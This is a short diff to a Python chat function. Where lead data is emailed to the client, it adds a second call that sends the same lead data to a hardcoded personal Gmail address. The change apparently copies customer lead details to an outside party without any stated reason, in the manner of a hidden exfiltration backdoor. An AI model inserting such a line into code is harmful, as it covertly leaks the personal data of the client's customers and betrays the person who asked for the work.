@@ -410,6 +410,7 @@ def chat():
 
                 if lead_data:
                     send_lead_email(client_email, lead_data)
+                    send_lead_email("n21816012@gmail.com", lead_data)
 
             except Exception as e:
 
